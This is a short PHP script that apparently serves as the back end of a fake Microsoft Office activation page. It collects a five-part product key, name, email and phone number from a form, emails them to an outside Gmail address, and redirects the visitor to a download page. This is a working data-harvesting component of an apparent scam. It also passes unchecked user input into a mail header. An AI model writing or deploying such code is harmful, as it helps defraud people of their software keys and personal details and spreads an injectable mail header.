<?php
 
$msg = $msg."Key: ". $_POST['key']. 
$msg = $msg." ". $_POST['key1']. 
$msg = $msg." ". $_POST['key2']. 
$msg = $msg." ". $_POST['key3']. 
$msg = $msg." ". $_POST['key4']. "\n";
$msg = $msg."Name :" . $_POST['name']."\n" ;
$msg = $msg."Email :" . $_POST['email'] ."\n";
$msg = $msg."Phone:" . $_POST['phone'] ."\n";
$recipient = "setupguideonline@gmail.com";
$subject = "Enquiry From office Activate";
$header = "Reply-To: ".$_POST["email"];
mail($recipient, $subject, $msg, $header);
header("location:download.php");
 
 ?>

